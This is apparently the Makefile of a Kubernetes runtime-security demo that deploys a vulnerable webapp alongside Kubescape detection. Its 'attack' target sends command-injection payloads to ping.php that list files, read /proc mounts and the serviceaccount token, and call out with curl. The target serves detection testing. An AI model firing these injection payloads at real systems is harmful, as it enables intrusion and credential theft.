NAME := bobctl
VERSION ?= 0.1.0
BUILD_DIR := bin

GO ?= go
GO_VERSION ?= 1.24

OUTPUT_PATH := $(BUILD_DIR)/$(OS)/$(ARCH)/$(NAME)
HELM = $(shell which helm)

CURRENT_CONTEXT := $(shell kubectl config current-context)
OS := $(shell uname -s | tr '[:upper:]' '[:lower:]')
ARCH := $(shell uname -m | sed 's/x86_64/amd64/')

GO_LDFLAGS := -s -w -X main.version=$(VERSION)

GO_FILES := $(shell find src -type f -name '*.go')

.PHONY: all
all: build

.PHONY: build
build: $(OUTPUT_PATH)

$(OUTPUT_PATH): $(GO_FILES)
	@echo "Building $(NAME) for $(OS)/$(ARCH)..."
	@mkdir -p $(dir $(OUTPUT_PATH))
	CGO_ENABLED=0 $(GO) build -trimpath -ldflags="$(GO_LDFLAGS)" -o $(OUTPUT_PATH) ./src/main.go
	@echo "Build complete: $(OUTPUT_PATH)"

.PHONY: clean
clean:
	@echo "Cleaning build artifacts..."
	@rm -rf $(BUILD_DIR)
	@echo "Clean complete."

.PHONY: docker-build
docker-build:
	@echo "Running docker build $(NAME)..."
	docker buildx build --platform linux/amd64,linux/arm64 -t ghcr.io/k8sstormcenter/$(NAME):latest -f Dockerfile .

.PHONY: run
run: build
	@echo "Running $(NAME)..."
	@$(OUTPUT_PATH)

.PHONY: mac-prep
mac-prep:
	docker buildx create --name mybuilder --driver docker-container --use


.PHONY: helm-install-no-bob
helm-install-no-bob: 
	@echo "Installing webapp without BoB configuration..."
	helm pull oci://ghcr.io/k8sstormcenter/mywebapp 
	helm upgrade --install webapp oci://ghcr.io/k8sstormcenter/mywebapp --version 0.1.0 --namespace webapp --create-namespace --set bob.create=false
	rm -rf mywebapp-0.1.0.tgz
	-kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=mywebapp -n webapp



.PHONY: helm-install
helm-install:
	@echo "Installing webapp with BoB configuration ..."
	helm pull oci://ghcr.io/k8sstormcenter/mywebapp 
	helm upgrade --install webapp oci://ghcr.io/k8sstormcenter/mywebapp --version 0.1.0 --namespace webapp --create-namespace --set bob.create=true
	rm -rf mywebapp-0.1.0.tgz
	-kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=mywebapp -n webapp




.PHONY: helm-test
helm-test:
	kubectl wait --for=condition=available --timeout=120s deployment/webapp-mywebapp -n webapp
	@echo "Deployment is ready. Running Helm tests..."
	helm test webapp -n webapp

.PHONY: helm-uninstall
helm-uninstall:
	helm uninstall webapp -n webapp

.PHONY: fwd 
fwd:
	-sudo kill -9 $$(sudo lsof -t -i :8080)
	kubectl --namespace webapp port-forward $$(kubectl get pods --namespace webapp -l "app.kubernetes.io/name=mywebapp,app.kubernetes.io/instance=webapp" -o jsonpath="{.items[0].metadata.name}") 8080:80 &

.PHONY: attack
attack:
	curl 127.0.0.1:8080/ping.php?ip=1.1.1.1\;ls
	curl  127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20/proc/self/mounts
	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20index.html"
	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20/run/secrets/kubernetes.io/serviceaccount/token"
	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcurl%20google.com"

.PHONY: kubescape
kubescape:
	-$(HELM) repo add kubescape https://kubescape.github.io/helm-charts/
	-$(HELM) repo update
	$(HELM) upgrade --install kubescape kubescape/kubescape-operator --version 1.28.0 -n honey --create-namespace --values kubescape/values.yaml
	-kubectl apply  -f kubescape/runtimerules.yaml
	sleep 5
	-kubectl rollout restart -n honey ds node-agent
	-kubectl wait --for=condition=ready pod -l app=node-agent  -n honey --timeout=120s



.PHONY: storage
storage:
	kubectl apply -f https://openebs.github.io/charts/openebs-operator-lite.yaml
	kubectl apply -f https://openebs.github.io/charts/openebs-lite-sc.yaml
	kubectl apply -f storage/sc.yaml
	kubectl patch storageclass local-hostpath -p '{"metadata": {"annotations":{"storageclass.kubernetes.io/is-default-class":"true"}}}'

.PHONY: wipe
wipe:
	-sudo kill -9 $$(sudo lsof -t -i :8080)
	-kubectl delete -f storage/sc.yaml
	-kubectl delete -f https://openebs.github.io/charts/openebs-operator-lite.yaml
	-kubectl delete -f https://openebs.github.io/charts/openebs-lite-sc.yaml
	-$(HELM) uninstall -n honey kubescape
	-$(HELM) uninstall -n webapp webapp




.PHONY: helm
HELM = $(shell pwd)/bin/helm
helm: ## Download helm if required
ifeq (,$(wildcard $(HELM)))
ifeq (,$(shell which helm 2> /dev/null))
	@{ \
		mkdir -p $(dir $(HELM)); \
		curl -sSLo $(HELM).tar.gz https://get.helm.sh/helm-v$(HELM_VERSION)-$(OS)-$(ARCH).tar.gz; \
		tar -xzf $(HELM).tar.gz --one-top-level=$(dir $(HELM)) --strip-components=1; \
		chmod + $(HELM); \
	}
else
HELM = $(shell which helm)
endif
endif
